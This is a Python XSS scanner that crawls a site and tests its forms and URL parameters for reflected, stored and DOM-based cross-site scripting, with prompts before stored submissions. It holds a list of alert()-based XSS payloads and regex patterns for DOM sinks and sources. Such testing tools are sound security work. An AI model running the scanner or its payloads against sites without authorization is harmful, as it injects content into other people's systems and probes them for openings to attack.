#!/usr/bin/env python3
"""
Multi-Type XSS Scanner: Reflected, Stored, and DOM-based.
For authorized security testing and educational purposes ONLY.

Author : Educational XSS Scanner
License: MIT

Usage:
    python3 xss_scanner.py http://target.lab
        (interactive menu will appear after crawl)
    python3 xss_scanner.py http://target.lab --max-pages 15 --browser
    python3 xss_scanner.py https://site.lab --skip-stored --output json
    python3 xss_scanner.py http://target.lab --no-menu   (non-interactive)
"""

import re
import sys
import time
import uuid
import json
import argparse
import urllib3
from collections import defaultdict
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

import requests
from bs4 import BeautifulSoup

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# Disable insecure-request warnings when --insecure is used
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


HEADERS = {
    "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"),
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9, "
               "*/*;q=0.8"),
    "Accept-Language": "en-US,en;q=0.5",
}

# ---------- Payloads ----------
REFLECTED_PAYLOADS = [
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><svg/onload=alert(1)>",
    '"><body onload=alert(1)>',
    '"><details open ontoggle=alert(1)>',
]

# Each sink is a (compiled_regex, human_name)
DOM_SINKS = [
    (r"\.innerHTML\s*=",            "innerHTML assignment"),
    (r"\.outerHTML\s*=",            "outerHTML assignment"),
    (r"document\.write(?:ln)?\s*\(", "document.write"),
    (r"\beval\s*\(",                "eval()"),
    (r"setTimeout\s*\(\s*[\"'`]",    "setTimeout with string"),
    (r"setInterval\s*\(\s*[\"'`]",  "setInterval with string"),
    (r"\bFunction\s*\(",            "Function constructor"),
    (r"\.insertAdjacentHTML\s*\(",  "insertAdjacentHTML"),
    (r"location\s*=\s*(?![\"'])",   "location assignment"),
    (r"location\.(?:href|hash|pathname|search)\s*=",
                                    "location property assignment"),
    (r"\$\([^)]*\)\.html\s*\(",     "jQuery .html()"),
    (r"\$\([^)]*\)\.append\s*\(",   "jQuery .append()"),
    (r"\$\([^)]*\)\.prepend\s*\(",  "jQuery .prepend()"),
    (r"dangerouslySetInnerHTML",    "React dangerouslySetInnerHTML"),
    (r"v-html\s*=",                 "Vue v-html"),
]

DOM_SOURCES = [
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"window\.location",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"window\.name",
    r"URLSearchParams",
    r"document\.cookie",
]


class XSSScanner:
    def __init__(self, base_url, max_pages=10, timeout=10, delay=0.5,
                 use_browser=False, force=False, insecure=False,
                 respect_robots=True, cookies=None, extra_headers=None):
        self.base_url = base_url.rstrip("/")
        self.domain = urlparse(base_url).netloc
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = not insecure
        if cookies:
            self.session.headers.update({"Cookie": cookies})
        if extra_headers:
            for h in extra_headers:
                if ":" in h:
                    k, v = h.split(":", 1)
                    self.session.headers[k.strip()] = v.strip()
        self.timeout = timeout
        self.delay = delay
        self.max_pages = max_pages
        self.use_browser = use_browser and PLAYWRIGHT_AVAILABLE
        self.force = force
        self.respect_robots = respect_robots

        self.visited = set()
        self.pages = []
        self.findings = []
        self.robots_disallowed = set()

    # ---------- utilities ----------
    def log(self, msg):
        print(msg, flush=True)

    def add_finding(self, xss_type, url, detail, payload=None, parameter=None):
        self.findings.append({
            "type": xss_type, "url": url, "detail": detail,
            "payload": payload, "parameter": parameter,
        })
        self.log(f"\n[!] {xss_type} XSS FOUND")
        self.log(f"    URL       : {url}")
        if parameter:
            self.log(f"    Parameter : {parameter}")
        if payload:
            self.log(f"    Payload   : {payload}")
        self.log(f"    Detail    : {detail}")

    def _same_domain(self, url):
        return urlparse(url).netloc == self.domain

    def fetch(self, url):
        try:
            time.sleep(self.delay)
            return self.session.get(url, timeout=self.timeout)
        except Exception as e:
            self.log(f"[-] Error fetching {url}: {e}")
            return None

    # ---------- robots.txt ----------
    def load_robots(self):
        if not self.respect_robots:
            return
        r = self.fetch(urljoin(self.base_url, "/robots.txt"))
        if not r or r.status_code != 200:
            return
        for line in r.text.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path:
                    self.robots_disallowed.add(path)

    def _robots_allows(self, url):
        if not self.respect_robots:
            return True
        path = urlparse(url).path or "/"
        for dis in self.robots_disallowed:
            if path == dis or path.startswith(dis):
                return False
        return True

    # ---------- crawling ----------
    def crawl(self):
        self.log(f"[*] Crawling {self.base_url} (max {self.max_pages} pages)")
        self.load_robots()
        queue = [self.base_url]
        while queue and len(self.visited) < self.max_pages:
            url = queue.pop(0).split("#")[0]
            if url in self.visited or not self._same_domain(url):
                continue
            if not self._robots_allows(url):
                self.log(f"[-] Skipping (robots.txt): {url}")
                self.visited.add(url)
                continue
            self.visited.add(url)
            r = self.fetch(url)
            if not r or r.status_code >= 400:
                continue
            if "text/html" not in r.headers.get("Content-Type", ""):
                continue
            soup = BeautifulSoup(r.text, "html.parser")
            self.pages.append((url, soup))
            for a in soup.find_all("a", href=True):
                href = a["href"]
                if href.startswith(("javascript:", "mailto:", "tel:", "#")):
                    continue
                full = urljoin(url, href).split("#")[0]
                if full not in self.visited and self._same_domain(full):
                    queue.append(full)
        self.log(f"[+] Crawled {len(self.pages)} page(s)")

    def extract_forms(self, url, soup):
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            action_url = urljoin(url, action) if action else url
            if not self._same_domain(action_url):
                continue
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                if inp.name == "textarea":
                    itype, value = "textarea", inp.get_text() or ""
                elif inp.name == "select":
                    itype = "select"
                    sel = inp.find("option", selected=True) or inp.find("option")
                    value = sel.get("value", "") if sel else ""
                else:
                    itype = inp.get("type", "text").lower()
                    value = inp.get("value", "")
                inputs.append({"name": name, "type": itype, "value": value})
            if inputs:
                forms.append({
                    "action": action_url, "method": method,
                    "inputs": inputs, "source_page": url,
                })
        return forms

    # ---------- 1) Reflected XSS ----------
    def scan_reflected(self):
        self.log("\n[*] === [1/3] Reflected XSS Scan ===")
        for url, soup in self.pages:
            for form in self.extract_forms(url, soup):
                testable = [i for i in form["inputs"]
                            if i["type"] in ("text", "textarea", "search",
                                             "url", "email", "password")]
                if not testable:
                    continue
                testable_names = {i["name"] for i in testable}

                for payload in REFLECTED_PAYLOADS:
                    data = {}
                    for i in form["inputs"]:
                        data[i["name"]] = (payload
                                            if i["name"] in testable_names
                                            else i["value"])
                    try:
                        if form["method"] == "post":
                            r = self.session.post(form["action"], data=data,
                                                  timeout=self.timeout)
                        else:
                            r = self.session.get(form["action"], params=data,
                                                 timeout=self.timeout)
                        time.sleep(self.delay)
                    except Exception:
                        continue
                    if payload in r.text:
                        self.add_finding(
                            "Reflected", form["action"],
                            "Payload reflected raw (unescaped) in response.",
                            payload=payload,
                            parameter=", ".join(testable_names),
                        )
                        break

    # ---------- 2) Stored XSS ----------
    def scan_stored(self):
        self.log("\n[*] === [2/3] Stored XSS Scan ===")
        self.log("[!] This SUBMITS test data to forms on the target.")
        self.log("[!] Guestbooks, comments, and profiles will receive test entries.")
        if not self.force:
            try:
                ans = input("    Continue with stored XSS scan? [y/N]: ").strip().lower()
            except EOFError:
                ans = "n"
            if ans != "y":
                self.log("[*] Skipping stored XSS scan.")
                return

        check_pages = list({p[0] for p in self.pages})

        for url, soup in self.pages:
            for form in self.extract_forms(url, soup):
                if form["method"] != "post":
                    continue
                testable = [i for i in form["inputs"]
                            if i["type"] in ("text", "textarea", "search",
                                             "url", "email")]
                if not testable:
                    continue
                testable_names = {i["name"] for i in testable}

                marker = "xss" + uuid.uuid4().hex[:8]
                payload = f'<script>alert("{marker}")</script>'

                data = {}
                for i in form["inputs"]:
                    data[i["name"]] = (payload
                                       if i["name"] in testable_names
                                       else i["value"])

                try:
                    self.session.post(form["action"], data=data,
                                       timeout=self.timeout)
                    time.sleep(1.5)
                except Exception:
                    continue

                for check_url in check_pages + [form["action"]]:
                    r = self.fetch(check_url)
                    if not r:
                        continue
                    if payload in r.text:
                        self.add_finding(
                            "Stored", check_url,
                            f"Payload persisted and returned unescaped "
                            f"(marker={marker}).",
                            payload=payload,
                            parameter=", ".join(testable_names),
                        )
                        break

    # ---------- 3) DOM-based XSS ----------
    def _static_dom_findings(self, code):
        hits = []
        for sink_re, sink_name in DOM_SINKS:
            for m in re.finditer(sink_re, code):
                lo = max(0, m.start() - 500)
                hi = min(len(code), m.end() + 500)
                ctx = code[lo:hi]
                for src_re in DOM_SOURCES:
                    if re.search(src_re, ctx):
                        hits.append((sink_name, src_re))
                        break
        return hits

    def scan_dom_static(self):
        self.log("\n[*] === [3/3a] DOM-based XSS -- static JS analysis ===")
        for url, soup in self.pages:
            scripts = []
            for s in soup.find_all("script"):
                if s.string:
                    scripts.append(("inline", s.string))
                elif s.get("src"):
                    src = urljoin(url, s["src"])
                    if self._same_domain(src):
                        r = self.fetch(src)
                        if r and r.status_code == 200:
                            scripts.append((src, r.text))

            for src_label, code in scripts:
                for sink, source in self._static_dom_findings(code):
                    self.add_finding(
                        "DOM-based (potential)", url,
                        f"Source '{source}' flows near sink '{sink}' in {src_label}",
                    )

    def _browser_confirm(self, context, test_url):
        confirmed = {"hit": False}
        page = context.new_page()

        def on_dialog(dialog):
            try:
                if dialog.type == "alert":
                    confirmed["hit"] = True
                dialog.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)
        try:
            page.goto(test_url, timeout=8000, wait_until="domcontentloaded")
            page.wait_for_timeout(1500)
        except Exception:
            pass
        finally:
            try:
                page.close()
            except Exception:
                pass
        return confirmed["hit"]

    def scan_dom_browser(self):
        self.log("\n[*] === [3/3b] DOM-based XSS -- browser verification ===")
        if not self.use_browser:
            self.log("[*] Skipping (Playwright not installed or --browser not set).")
            return

        payload = '<img src=x onerror=alert(1)>'
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(ignore_https_errors=True)
            try:
                for url, _ in self.pages:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)

                    test_params = list(params.keys())
                    if not test_params:
                        hash_url = url.split("#")[0] + "#" + payload
                        if self._browser_confirm(context, hash_url):
                            self.add_finding(
                                "DOM-based (confirmed)", hash_url,
                                "alert() executed via URL fragment.",
                                payload=payload, parameter="#fragment",
                            )
                        continue

                    for param in test_params:
                        q = dict(params)
                        q[param] = [payload]
                        new_q = urlencode(q, doseq=True)
                        test_url = urlunparse(
                            (parsed.scheme, parsed.netloc, parsed.path,
                             parsed.params, new_q, "")
                        )
                        if self._browser_confirm(context, test_url):
                            self.add_finding(
                                "DOM-based (confirmed)", test_url,
                                f"alert() executed via URL parameter '{param}'.",
                                payload=payload, parameter=param,
                            )
            finally:
                browser.close()

    # ---------- summary ----------
    def summary(self):
        self.log("\n" + "=" * 62)
        self.log(" SCAN SUMMARY")
        self.log("=" * 62)
        if not self.findings:
            self.log("No potential XSS vulnerabilities were detected.")
            return
        grouped = defaultdict(list)
        for f in self.findings:
            grouped[f["type"]].append(f)
        for xtype, items in grouped.items():
            self.log(f"\n{xtype}: {len(items)} finding(s)")
            for f in items:
                self.log(f"  - {f['url']}")
                if f["parameter"]:
                    self.log(f"      parameter: {f['parameter']}")
                if f["payload"]:
                    self.log(f"      payload  : {f['payload']}")
                self.log(f"      {f['detail']}")
        self.log("\n[i] Note: 'potential' DOM findings require manual review.")
        self.log("[i] Always manually verify reported findings.")

    def to_json(self):
        return json.dumps({
            "target": self.base_url,
            "pages_crawled": len(self.pages),
            "findings": self.findings,
        }, indent=2)


def prompt_scan_menu():
    """Show interactive scan-type menu.

    Returns one of: 'reflected', 'stored', 'dom', 'all', or None (exit).
    Loops on invalid input so the user can correct typos without re-running.
    """
    print()
    print("=" * 50)
    print("  Select XSS Scan Type")
    print("=" * 50)
    print("  [1] Reflected XSS")
    print("  [2] Stored XSS    (writes data to target -- use with care)")
    print("  [3] DOM-based XSS")
    print("  [4] Run ALL scans")
    print("  [0] Exit (no scan)")
    print("=" * 50)
    while True:
        try:
            choice = input("Enter your choice [0-4]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return None
        mapping = {
            "1": "reflected",
            "2": "stored",
            "3": "dom",
            "4": "all",
            "0": None,
        }
        if choice in mapping:
            return mapping[choice]
        print("[-] Invalid choice. Please enter 0, 1, 2, 3, or 4.")


def main():
    parser = argparse.ArgumentParser(
        description="Multi-type XSS scanner (Reflected / Stored / DOM-based)."
    )
    parser.add_argument("url", help="Target URL (include http(s)://)")
    parser.add_argument("--max-pages", type=int, default=10,
                        help="Max pages to crawl (default: 10)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.5,
                        help="Delay between requests (seconds)")
    parser.add_argument("--browser", action="store_true",
                        help="Use Playwright to confirm DOM-based XSS")
    parser.add_argument("--force", action="store_true",
                        help="Skip confirmation prompt for stored XSS scan")
    parser.add_argument("--skip-reflected", action="store_true")
    parser.add_argument("--skip-stored", action="store_true")
    parser.add_argument("--skip-dom", action="store_true")
    parser.add_argument("--insecure", action="store_true",
                        help="Disable TLS certificate verification (lab use)")
    parser.add_argument("--ignore-robots", action="store_true",
                        help="Do not respect robots.txt")
    parser.add_argument("--cookies", type=str, default=None,
                        help='Cookie header string, e.g. "session=abc; role=user"')
    parser.add_argument("--header", action="append", default=[],
                        help="Extra header, e.g. --header 'X-Api-Key: 123'")
    parser.add_argument("--output", choices=["text", "json"], default="text",
                        help="Output format (default: text)")
    parser.add_argument("--no-menu", action="store_true",
                        help="Disable interactive scan-type menu "
                             "(use for CI/CD or scripting)")
    args = parser.parse_args()

    if not urlparse(args.url).scheme:
        print("[-] URL must include http:// or https://")
        sys.exit(1)
    if args.browser and not PLAYWRIGHT_AVAILABLE:
        print("[-] --browser requires Playwright:\n"
              "    pip install playwright && playwright install chromium")
        sys.exit(1)

    scanner = XSSScanner(
        args.url,
        max_pages=args.max_pages,
        timeout=args.timeout,
        delay=args.delay,
        use_browser=args.browser,
        force=args.force,
        insecure=args.insecure,
        respect_robots=not args.ignore_robots,
        cookies=args.cookies,
        extra_headers=args.header,
    )
    # Decide whether to show the interactive scan-type menu.
    skip_flags_used = (args.skip_reflected or args.skip_stored or args.skip_dom)
    use_menu = (args.output == "text"
                and sys.stdin.isatty()
                and not skip_flags_used
                and not args.no_menu)

    try:
        scanner.crawl()

        if use_menu:
            selection = prompt_scan_menu()
            if selection is None:
                print("[*] Exiting without running any scan.")
                return
            do_reflected = selection in ("reflected", "all")
            do_stored    = selection in ("stored",     "all")
            do_dom       = selection in ("dom",        "all")
        else:
            do_reflected = not args.skip_reflected
            do_stored    = not args.skip_stored
            do_dom       = not args.skip_dom

        if do_reflected:
            scanner.scan_reflected()
        if do_stored:
            scanner.scan_stored()
        if do_dom:
            scanner.scan_dom_static()
            scanner.scan_dom_browser()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        if args.output == "json":
            print(scanner.to_json())
        else:
            scanner.summary()


if __name__ == "__main__":
    main()